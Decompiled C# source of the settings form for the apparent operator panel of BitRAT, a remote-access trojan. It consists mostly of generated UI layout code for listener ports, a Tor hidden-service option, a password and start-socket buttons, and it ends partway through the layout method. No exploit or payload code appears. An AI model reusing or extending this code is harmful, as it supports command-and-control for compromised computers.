﻿using BitRAT;
using BitRAT.My;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fSettings : Form
{
    private IContainer icontainer_0;
    private Button button_0;
    private Button button_1;
    private Splitter splitter_0;
    private TabControl tabControl_0;
    private TabPage tabPage_0;
    private Label label_0;
    private Label label_1;
    private TextBox textBox_0;
    private CheckBox checkBox_0;
    private TextBox textBox_1;
    private Label label_2;
    private TextBox textBox_2;
    private Label label_3;
    private TabPage tabPage_1;
    private TextBox textBox_3;
    private Label label_4;
    private Label label_5;
    private PictureBox pictureBox_0;
    private TabPage tabPage_2;
    private Label label_6;
    private Label label_7;
    private TextBox textBox_4;
    private TextBox textBox_5;
    private Label label_8;
    private PictureBox pictureBox_1;
    private Label label_9;
    private TextBox textBox_6;
    private Label label_10;
    private TabPage tabPage_3;
    private PictureBox pictureBox_2;
    private CheckBox checkBox_1;
    private RadioButton radioButton_0;
    private Label label_11;
    private RadioButton radioButton_1;
    private Label label_12;
    private Label label_13;
    private TrackBar trackBar_0;
    private Label label_14;
    private TextBox textBox_7;
    private Label label_15;
    private Label label_16;
    private TextBox textBox_8;
    private Label label_17;
    private TextBox textBox_9;
    private Label label_18;
    private Label label_19;
    private TextBox textBox_10;
    private ComboBox comboBox_0;
    private Label label_20;
    private ComboBox comboBox_1;
    private Label label_21;
    private CheckBox checkBox_2;
    private TrackBar trackBar_1;
    private Label label_22;
    private Label label_23;
    private CheckBox checkBox_3;
    private PictureBox pictureBox_3;
    private CheckBox checkBox_4;
    private PictureBox pictureBox_4;
    private Label label_24;
    private TextBox textBox_11;
    private PictureBox pictureBox_5;
    private Label label_25;
    private TextBox textBox_12;
    private Label label_26;
    private TextBox textBox_13;
    private Label label_27;
    private TextBox textBox_14;
    private Label label_28;
    private CheckBox checkBox_5;
    private TextBox textBox_15;
    private Label label_29;
    private PictureBox pictureBox_6;
    private PictureBox pictureBox_7;
    private Label label_30;
    private TextBox textBox_16;
    private Label label_31;
    private Label label_32;
    private TextBox textBox_17;
    private Label label_33;
    private PictureBox pictureBox_8;
    private CheckBox checkBox_6;
    private PictureBox pictureBox_9;
    private RadioButton radioButton_2;
    private RadioButton radioButton_3;
    private VisualButton visualButton_0;
    private VisualButton visualButton_1;
    private Timer timer_0;
    private VisualButton visualButton_2;
    private VisualButton visualButton_3;
    private VisualButton visualButton_4;
    private VisualButton visualButton_5;
    private VisualButton visualButton_6;
    private TabPage tabPage_4;
    private CheckBox checkBox_7;
    private CheckBox checkBox_8;
    private VisualButton visualButton_7;
    private PictureBox pictureBox_10;
    private Label label_34;
    private Label label_35;
    private CheckBox checkBox_9;
    private TabPage tabPage_5;
    private Label label_36;
    private CheckBox checkBox_10;
    private VisualButton visualButton_8;
    private CheckBox checkBox_11;
    private CheckBox checkBox_12;
    private PictureBox pictureBox_11;
    private CheckBox checkBox_13;
    private CheckBox checkBox_14;
    private PictureBox pictureBox_12;
    private TextBox textBox_18;
    private Label label_37;
    private Timer timer_1;
    private PictureBox pictureBox_13;
    private PictureBox pictureBox_14;
    private TabPage tabPage_6;
    private VisualButton visualButton_9;
    private VisualButton visualButton_10;
    private TextBox textBox_19;
    private Label label_38;
    private PictureBox pictureBox_15;
    private FastObjectListView fastObjectListView_0;
    private OLVColumn olvcolumn_0;
    private OLVColumn olvcolumn_1;
    private BackgroundWorker backgroundWorker_0;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private VisualButton visualButton_11;
    private CheckBox checkBox_15;
    private Label label_39;
    private CheckBox checkBox_16;
    private CheckBox checkBox_17;
    private fMain fMain_0;

    public fSettings()
    {
        base.Load += new EventHandler(this.fSettings_Load);
        base.Closing += new CancelEventHandler(this.fSettings_Closing);
        this.InitializeComponent();
    }

    [CompilerGenerated]
    private void _Lambda$__588-0()
    {
        MySettings settings;
        int portMain = (settings = Class135.smethod_0()).PortMain;
        this.fMain_0.method_26(ref portMain, ref string.Empty);
        settings.PortMain = portMain;
    }

    [CompilerGenerated]
    private void _Lambda$__588-1()
    {
        MySettings settings;
        MySettings settings2;
        int portMain = (settings = Class135.smethod_0()).PortMain;
        string hostMainIP = (settings2 = Class135.smethod_0()).HostMainIP;
        this.fMain_0.method_26(ref portMain, ref hostMainIP);
        settings2.HostMainIP = hostMainIP;
        settings.PortMain = portMain;
    }

    [CompilerGenerated]
    private void _Lambda$__589-0()
    {
        MySettings settings;
        int portTor = (settings = Class135.smethod_0()).PortTor;
        this.fMain_0.method_28(ref portTor, ref string.Empty);
        settings.PortTor = portTor;
    }

    [CompilerGenerated]
    private void _Lambda$__589-1()
    {
        MySettings settings;
        MySettings settings2;
        int portTor = (settings = Class135.smethod_0()).PortTor;
        string hostMainIP = (settings2 = Class135.smethod_0()).HostMainIP;
        this.fMain_0.method_28(ref portTor, ref hostMainIP);
        settings2.HostMainIP = hostMainIP;
        settings.PortTor = portTor;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fSettings_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    private void fSettings_Load(object sender, EventArgs e)
    {
        this.method_3();
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_5(new Splitter());
        this.vmethod_7(new TabControl());
        this.vmethod_9(new TabPage());
        this.vmethod_229(new PictureBox());
        this.vmethod_231(new PictureBox());
        this.vmethod_179(new VisualButton());
        this.vmethod_177(new VisualButton());
        this.vmethod_173(new VisualButton());
        this.vmethod_171(new VisualButton());
        this.vmethod_145(new PictureBox());
        this.vmethod_147(new PictureBox());
        this.vmethod_139(new CheckBox());
        this.vmethod_135(new TextBox());
        this.vmethod_137(new Label());
        this.vmethod_123(new PictureBox());
        this.vmethod_125(new Label());
        this.vmethod_117(new PictureBox());
        this.vmethod_119(new Label());
        this.vmethod_121(new TextBox());
        this.vmethod_11(new Label());
        this.vmethod_13(new Label());
        this.vmethod_15(new TextBox());
        this.vmethod_17(new CheckBox());
        this.vmethod_19(new TextBox());
        this.vmethod_21(new Label());
        this.vmethod_23(new TextBox());
        this.vmethod_25(new Label());
        this.vmethod_27(new TabPage());
        this.vmethod_181(new VisualButton());
        this.vmethod_167(new RadioButton());
        this.vmethod_169(new RadioButton());
        this.vmethod_163(new CheckBox());
        this.vmethod_155(new Label());
        this.vmethod_157(new TextBox());
        this.vmethod_159(new Label());
        this.vmethod_149(new Label());
        this.vmethod_151(new TextBox());
        this.vmethod_153(new Label());
        this.vmethod_141(new TextBox());
        this.vmethod_143(new Label());
        this.vmethod_51(new Label());
        this.vmethod_53(new TextBox());
        this.vmethod_55(new Label());
        this.vmethod_33(new Label());
        this.vmethod_29(new TextBox());
        this.vmethod_31(new Label());
        this.vmethod_165(new PictureBox());
        this.vmethod_161(new PictureBox());
        this.vmethod_49(new PictureBox());
        this.vmethod_35(new PictureBox());
        this.vmethod_57(new TabPage());
        this.vmethod_183(new VisualButton());
        this.vmethod_111(new CheckBox());
        this.vmethod_77(new TextBox());
        this.vmethod_105(new TrackBar());
        this.vmethod_107(new Label());
        this.vmethod_109(new Label());
        this.vmethod_103(new CheckBox());
        this.vmethod_95(new ComboBox());
        this.vmethod_97(new Label());
        this.vmethod_99(new ComboBox());
        this.vmethod_101(new Label());
        this.vmethod_85(new Label());
        this.vmethod_87(new TextBox());
        this.vmethod_89(new Label());
        this.vmethod_91(new Label());
        this.vmethod_93(new TextBox());
        this.vmethod_75(new Label());
        this.vmethod_79(new Label());
        this.vmethod_81(new Label());
        this.vmethod_83(new TextBox());
        this.vmethod_73(new TrackBar());
        this.vmethod_69(new Label());
        this.vmethod_71(new Label());
        this.vmethod_63(new RadioButton());
        this.vmethod_65(new Label());
        this.vmethod_67(new RadioButton());
        this.vmethod_61(new CheckBox());
        this.vmethod_59(new PictureBox());
        this.vmethod_37(new TabPage());
        this.vmethod_263(new CheckBox());
        this.vmethod_185(new VisualButton());
        this.vmethod_131(new TextBox());
        this.vmethod_133(new Label());
        this.vmethod_127(new TextBox());
        this.vmethod_129(new Label());
        this.vmethod_115(new CheckBox());
        this.vmethod_45(new TextBox());
        this.vmethod_47(new Label());
        this.vmethod_43(new TextBox());
        this.vmethod_39(new Label());
        this.vmethod_41(new Label());
        this.vmethod_113(new PictureBox());
        this.vmethod_187(new TabPage());
        this.vmethod_265(new CheckBox());
        this.vmethod_259(new CheckBox());
        this.vmethod_261(new Label());
        this.vmethod_195(new PictureBox());
        this.vmethod_197(new Label());
        this.vmethod_199(new Label());
        this.vmethod_201(new CheckBox());
        this.vmethod_193(new VisualButton());
        this.vmethod_189(new CheckBox());
        this.vmethod_191(new CheckBox());
        this.vmethod_203(new TabPage());
        this.vmethod_221(new PictureBox());
        this.vmethod_223(new TextBox());
        this.vmethod_225(new Label());
        this.vmethod_217(new CheckBox());
        this.vmethod_219(new CheckBox());
        this.vmethod_213(new CheckBox());
        this.vmethod_211(new CheckBox());
        this.vmethod_205(new Label());
        this.vmethod_207(new CheckBox());
        this.vmethod_209(new VisualButton());
        this.vmethod_215(new PictureBox());
        this.vmethod_233(new TabPage());
        this.vmethod_257(new VisualButton());
        this.vmethod_245(new FastObjectListView());
        this.vmethod_247(new OLVColumn());
        this.vmethod_249(new OLVColumn());
        this.vmethod_253(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_255(new ToolStripMenuItem());
        this.vmethod_243(new PictureBox());
        this.vmethod_235(new VisualButton());
        this.vmethod_237(new VisualButton());
        this.vmethod_239(new TextBox());
        this.vmethod_241(new Label());
        this.vmethod_175(new Timer(this.icontainer_0));
        this.vmethod_227(new Timer(this.icontainer_0));
        this.vmethod_251(new BackgroundWorker());
        this.vmethod_6().SuspendLayout();
        this.vmethod_8().SuspendLayout();
        ((ISupportInitialize) this.vmethod_228()).BeginInit();
        ((ISupportInitialize) this.vmethod_230()).BeginInit();
        ((ISupportInitialize) this.vmethod_144()).BeginInit();
        ((ISupportInitialize) this.vmethod_146()).BeginInit();
        ((ISupportInitialize) this.vmethod_122()).BeginInit();
        ((ISupportInitialize) this.vmethod_116()).BeginInit();
        this.vmethod_26().SuspendLayout();
        ((ISupportInitialize) this.vmethod_164()).BeginInit();
        ((ISupportInitialize) this.vmethod_160()).BeginInit();
        ((ISupportInitialize) this.vmethod_48()).BeginInit();
        ((ISupportInitialize) this.vmethod_34()).BeginInit();
        this.vmethod_56().SuspendLayout();
        this.vmethod_104().BeginInit();
        this.vmethod_72().BeginInit();
        ((ISupportInitialize) this.vmethod_58()).BeginInit();
        this.vmethod_36().SuspendLayout();
        ((ISupportInitialize) this.vmethod_112()).BeginInit();
        this.vmethod_186().SuspendLayout();
        ((ISupportInitialize) this.vmethod_194()).BeginInit();
        this.vmethod_202().SuspendLayout();
        ((ISupportInitialize) this.vmethod_220()).BeginInit();
        ((ISupportInitialize) this.vmethod_214()).BeginInit();
        this.vmethod_232().SuspendLayout();
        this.vmethod_244().BeginInit();
        this.vmethod_252().SuspendLayout();
        ((ISupportInitialize) this.vmethod_242()).BeginInit();
        base.SuspendLayout();
        this.vmethod_4().Location = new Point(0, 0);
        this.vmethod_4().Margin = new Padding(1);
        this.vmethod_4().Name = "Splitter1";
        this.vmethod_4().Size = new Size(1, 0xfc);
        this.vmethod_4().TabIndex = 9;
        this.vmethod_4().TabStop = false;
        this.vmethod_6().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_6().Controls.Add(this.vmethod_8());
        this.vmethod_6().Controls.Add(this.vmethod_26());
        this.vmethod_6().Controls.Add(this.vmethod_56());
        this.vmethod_6().Controls.Add(this.vmethod_36());
        this.vmethod_6().Controls.Add(this.vmethod_186());
        this.vmethod_6().Controls.Add(this.vmethod_202());
        this.vmethod_6().Controls.Add(this.vmethod_232());
        this.vmethod_6().Location = new Point(0, 0);
        this.vmethod_6().Margin = new Padding(2);
        this.vmethod_6().Name = "tbSettings";
        this.vmethod_6().SelectedIndex = 0;
        this.vmethod_6().Size = new Size(0x243, 0xfc);
        this.vmethod_6().TabIndex = 0x11;
        this.vmethod_8().BackColor = SystemColors.AppWorkspace;
        this.vmethod_8().Controls.Add(this.vmethod_228());
        this.vmethod_8().Controls.Add(this.vmethod_230());
        this.vmethod_8().Controls.Add(this.vmethod_178());
        this.vmethod_8().Controls.Add(this.vmethod_176());
        this.vmethod_8().Controls.Add(this.vmethod_172());
        this.vmethod_8().Controls.Add(this.vmethod_170());
        this.vmethod_8().Controls.Add(this.vmethod_144());
        this.vmethod_8().Controls.Add(this.vmethod_146());
        this.vmethod_8().Controls.Add(this.vmethod_138());
        this.vmethod_8().Controls.Add(this.vmethod_134());
        this.vmethod_8().Controls.Add(this.vmethod_136());
        this.vmethod_8().Controls.Add(this.vmethod_122());
        this.vmethod_8().Controls.Add(this.vmethod_124());
        this.vmethod_8().Controls.Add(this.vmethod_116());
        this.vmethod_8().Controls.Add(this.vmethod_118());
        this.vmethod_8().Controls.Add(this.vmethod_120());
        this.vmethod_8().Controls.Add(this.vmethod_10());
        this.vmethod_8().Controls.Add(this.vmethod_12());
        this.vmethod_8().Controls.Add(this.vmethod_14());
        this.vmethod_8().Controls.Add(this.vmethod_16());
        this.vmethod_8().Controls.Add(this.vmethod_18());
        this.vmethod_8().Controls.Add(this.vmethod_20());
        this.vmethod_8().Controls.Add(this.vmethod_22());
        this.vmethod_8().Controls.Add(this.vmethod_24());
        this.vmethod_8().Location = new Point(4, 0x16);
        this.vmethod_8().Margin = new Padding(2);
        this.vmethod_8().Name = "tbConnection";
        this.vmethod_8().Padding = new Padding(2);
        this.vmethod_8().Size = new Size(0x23b, 0xe2);
        this.vmethod_8().TabIndex = 0;
        this.vmethod_8().Text = "Main";
        this.vmethod_228().Image = Class131.smethod_52();
        this.vmethod_228().Location = new Point(0xec, 0x43);
        this.vmethod_228().Margin = new Padding(2);
        this.vmethod_228().Name = "pbUnlock";
        this.vmethod_228().Size = new Size(15, 15);
        this.vmethod_228().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_228().TabIndex = 0x7e;
        this.vmethod_228().TabStop = false;
        this.vmethod_230().Image = Class131.smethod_29();
        this.vmethod_230().Location = new Point(0xec, 0x43);
        this.vmethod_230().Margin = new Padding(2);
        this.vmethod_230().Name = "pbLock";
        this.vmethod_230().Size = new Size(15, 15);
        this.vmethod_230().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_230().TabIndex = 0x7f;
        this.vmethod_230().TabStop = false;
        this.vmethod_178().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_178().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_178().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_178().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_178().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_178().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_178().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_178().Border.HoverVisible = true;
        this.vmethod_178().Border.Rounding = 6;
        this.vmethod_178().Border.Thickness = 1;
        this.vmethod_178().Border.Type = ShapeTypes.Rounded;
        this.vmethod_178().Border.Visible = true;
        this.vmethod_178().DialogResult = DialogResult.None;
        this.vmethod_178().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_178().Image = null;
        this.vmethod_178().Location = new Point(0x1f2, 0xcc);
        this.vmethod_178().MouseState = MouseStates.Normal;
        this.vmethod_178().Name = "btnSaveSettings";
        this.vmethod_178().Size = new Size(0x44, 0x13);
        this.vmethod_178().TabIndex = 0x2c;
        this.vmethod_178().Text = "Save";
        this.vmethod_178().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_178().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_178().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_178().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_178().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_178().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_178().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_178().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_176().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_176().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_176().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_176().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_176().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_176().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_176().Border.HoverVisible = true;
        this.vmethod_176().Border.Rounding = 6;
        this.vmethod_176().Border.Thickness = 1;
        this.vmethod_176().Border.Type = ShapeTypes.Rounded;
        this.vmethod_176().Border.Visible = true;
        this.vmethod_176().DialogResult = DialogResult.None;
        this.vmethod_176().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_176().Image = null;
        this.vmethod_176().Location = new Point(0x15a, 0x25);
        this.vmethod_176().MouseState = MouseStates.Normal;
        this.vmethod_176().Name = "btnTorConfig";
        this.vmethod_176().Size = new Size(0x6a, 0x13);
        this.vmethod_176().TabIndex = 0x2b;
        this.vmethod_176().Text = "Tor hidden service";
        this.vmethod_176().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_176().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_176().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_176().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_176().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_176().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_176().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_176().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_172().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_172().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_172().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_172().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_172().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_172().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_172().Border.HoverVisible = true;
        this.vmethod_172().Border.Rounding = 6;
        this.vmethod_172().Border.Thickness = 1;
        this.vmethod_172().Border.Type = ShapeTypes.Rounded;
        this.vmethod_172().Border.Visible = true;
        this.vmethod_172().DialogResult = DialogResult.None;
        this.vmethod_172().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_172().Image = null;
        this.vmethod_172().Location = new Point(170, 0x26);
        this.vmethod_172().MouseState = MouseStates.Normal;
        this.vmethod_172().Name = "btnStartStopTorSocket";
        this.vmethod_172().Size = new Size(80, 0x13);
        this.vmethod_172().TabIndex = 0x29;
        this.vmethod_172().Text = "Start socket";
        this.vmethod_172().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_172().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_172().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_172().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_172().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_172().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_172().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_172().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_170().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_170().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_170().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_170().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_170().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_170().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_170().Border.HoverVisible = true;
        this.vmethod_170().Border.Rounding = 6;
        this.vmethod_170().Border.Thickness = 1;
        this.vmethod_170().Border.Type = ShapeTypes.Rounded;
        this.vmethod_170().Border.Visible = true;
        this.vmethod_170().DialogResult = DialogResult.None;
        this.vmethod_170().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_170().Image = null;
        this.vmethod_170().Location = new Point(170, 12);
        this.vmethod_170().MouseState = MouseStates.Normal;
        this.vmethod_170().Name = "btnStartStopMainSocket";
        this.vmethod_170().Size = new Size(80, 0x13);
        this.vmethod_170().TabIndex = 40;
        this.vmethod_170().Text = "Start socket";
        this.vmethod_170().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_170().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_170().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_170().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_170().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_170().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_170().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_170().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_144().Image = Class131.smethod_24();
        this.vmethod_144().Location = new Point(0x141, 13);
        this.vmethod_144().Margin = new Padding(2);
        this.vmethod_144().Name = "pbMainPort";
        this.vmethod_144().Size = new Size(15, 15);
        this.vmethod_144().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_144().TabIndex = 0x26;
        this.vmethod_144().TabStop = false;
        this.vmethod_146().Image = Class131.smethod_24();
        this.vmethod_146().Location = new Point(0x141, 0x27);
        this.vmethod_146().Margin = new Padding(2);
        this.vmethod_146().Name = "pbTorPort";
        this.vmethod_146().Size = new Size(15, 15);
        this.vmethod_146().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_146().TabIndex = 0x25;
        this.vmethod_146().TabStop = false;
        this.vmethod_138().AutoSize = true;
        this.vmethod_138().BackColor = Color.Transparent;
        this.vmethod_138().Location = new Point(0xfe, 0x26);
        this.vmethod_138().Margin = new Padding(1);
        this.vmethod_138().Name = "chkAutostartTor";
        this.vmethod_138().RightToLeft = RightToLeft.Yes;
        this.vmethod_138().Size = new Size(0x44, 0x11);
        this.vmethod_138().TabIndex = 0x24;
        this.vmethod_138().Text = "Autostart";
        this.vmethod_138().UseVisualStyleBackColor = false;
        this.vmethod_134().Location = new Point(0x5b, 0x26);
        this.vmethod_134().Margin = new Padding(1);
        this.vmethod_134().MaxLength = 5;
        this.vmethod_134().Name = "txtTorPort";
        this.vmethod_134().Size = new Size(0x4b, 20);
        this.vmethod_134().TabIndex = 0x22;
        this.vmethod_136().AutoSize = true;
        this.vmethod_136().BackColor = Color.Transparent;
        this.vmethod_136().FlatStyle = FlatStyle.Flat;
        this.vmethod_136().Location = new Point(0x2a, 40);
        this.vmethod_136().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_136().Name = "lblTorPort";
        this.vmethod_136().Size = new Size(0x2f, 13);
        this.vmethod_136().TabIndex = 0x21;
        this.vmethod_136().Text = "Tor port:";
        this.vmethod_136().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_122().Image = Class131.smethod_24();
        this.vmethod_122().Location = new Point(0x205, 0x77);
        this.vmethod_122().Margin = new Padding(2);
        this.vmethod_122().Name = "pbNetworkBandwidthInfo";
        this.vmethod_122().Size = new Size(15, 15);
        this.vmethod_122().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_122().TabIndex = 0x20;
        this.vmethod_122().TabStop = false;
        this.vmethod_124().AutoSize = true;
        this.vmethod_124().BackColor = Color.Transparent;
        this.vmethod_124().FlatStyle = FlatStyle.Flat;
        this.vmethod_124().Location = new Point(0x192, 0x77);
        this.vmethod_124().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_124().Name = "lblNetworkBandwidthInfo";
        this.vmethod_124().Size = new Size(0x70, 13);
        this.vmethod_124().TabIndex = 0x1f;
        this.vmethod_124().Text = "(URL to speedtest file)";
        this.vmethod_124().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_116().Image = Class131.smethod_24();
        this.vmethod_116().Location = new Point(0x195, 0x5e);
        this.vmethod_116().Margin = new Padding(2);
        this.vmethod_116().Name = "pbLocalIPInfo";
        this.vmethod_116().Size = new Size(15, 15);
        this.vmethod_116().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_116().TabIndex = 30;
        this.vmethod_116().TabStop = false;
        this.vmethod_118().AutoSize = true;
        this.vmethod_118().BackColor = Color.Transparent;
        this.vmethod_118().FlatStyle = FlatStyle.Flat;
        this.vmethod_118().Location = new Point(12, 0x77);
        this.vmethod_118().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_118().Name = "lblNetworkBandwidth";
        this.vmethod_118().Size = new Size(0x4d, 13);
        this.vmethod_118().TabIndex = 0x1c;
        this.vmethod_118().Text = "Speed-test file:";
        this.vmethod_118().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_120().Location = new Point(0x5b, 0x74);
        this.vmethod_120().Margin = new Padding(1);
        this.vmethod_120().MaxLength = 0x800;
        this.vmethod_120().Name = "txtNetworkBandwidth";
        this.vmethod_120().Size = new Size(0x135, 20);
        this.vmethod_120().TabIndex = 0x1b;
        this.vmethod_10().AutoSize = true;
        this.vmethod_10().BackColor = Color.Transparent;
        this.vmethod_10().FlatStyle = FlatStyle.Flat;
        this.vmethod_10().Location = new Point(0xeb, 0x5e);
        this.vmethod_10().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_10().Name = "lblLocalIPInfo";
        this.vmethod_10().Size = new Size(0xa7, 13);
        this.vmethod_10().TabIndex = 0x1a;
        this.vmethod_10().Text = "(For expert use only. Leave blank)";
        this.vmethod_10().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_12().AutoSize = true;
        this.vmethod_12().BackColor = Color.Transparent;
        this.vmethod_12().FlatStyle = FlatStyle.Flat;
        this.vmethod_12().Location = new Point(40, 0x5e);
        this.vmethod_12().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_12().Name = "lblLocalIP";
        this.vmethod_12().Size = new Size(0x31, 13);
        this.vmethod_12().TabIndex = 0x19;
        this.vmethod_12().Text = "Local IP:";
        this.vmethod_12().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_14().Location = new Point(0x5b, 90);
        this.vmethod_14().Margin = new Padding(1);
        this.vmethod_14().MaxLength = 0x27;
        this.vmethod_14().Name = "txtLocalIP";
        this.vmethod_14().Size = new Size(0x8e, 20);
        this.vmethod_14().TabIndex = 0x18;
        this.vmethod_16().AutoSize = true;
        this.vmethod_16().BackColor = Color.Transparent;
        this.vmethod_16().Location = new Point(0xfe, 12);
        this.vmethod_16().Margin = new Padding(1);
        this.vmethod_16().Name = "chkAutostartMain";
        this.vmethod_16().RightToLeft = RightToLeft.Yes;
        this.vmethod_16().Size = new Size(0x44, 0x11);
        this.vmethod_16().TabIndex = 0x17;
        this.vmethod_16().Text = "Autostart";
        this.vmethod_16().UseVisualStyleBackColor = false;
        this.vmethod_18().Location = new Point(0x5b, 0x40);
        this.vmethod_18().Margin = new Padding(1);
        this.vmethod_18().MaxLength = 0x10;
        this.vmethod_18().Name = "txtPassword";
        this.vmethod_18().PasswordChar = '*';
        this.vmethod_18().Size = new Size(0x8e, 20);
        this.vmethod_18().TabIndex = 0x13;
        this.vmethod_20().AutoSize = true;
        this.vmethod_20().BackColor = Color.Transparent;
        this.vmethod_20().FlatStyle = FlatStyle.Flat;
        this.vmethod_20().Location = new Point(0x1f, 0x43);
        this.vmethod_20().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_20().Name = "lblPassword";
        this.vmethod_20().Size = new Size(0x38, 13);
        this.vmethod_20().TabIndex = 0x12;
        this.vmethod_20().Text = "Password:";
        this.vmethod_22().Location = new Point(0x5b, 12);
        this.vmethod_22().Margin = new Padding(1);
        this.vmethod_22().MaxLength = 5;
        this.vmethod_22().Name = "txtMainPort";
        this.vmethod_22().Size = new Size(0x4b, 20);
        this.vmethod_22().TabIndex = 0x11;
        this.vmethod_24().AutoSize = true;
        this.vmethod_24().BackColor = Color.Transparent;
        this.vmethod_24().FlatStyle = FlatStyle.Flat;
        this.vmethod_24().Location = new Point(4, 14);
        this.vmethod_24().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_24().Name = "lblMainPort";
        this.vmethod_24().Size = new Size(0x53, 13);
        this.vmethod_24().TabIndex = 0x10;
        this.vmethod_24().Text = "Main port (SSL):";
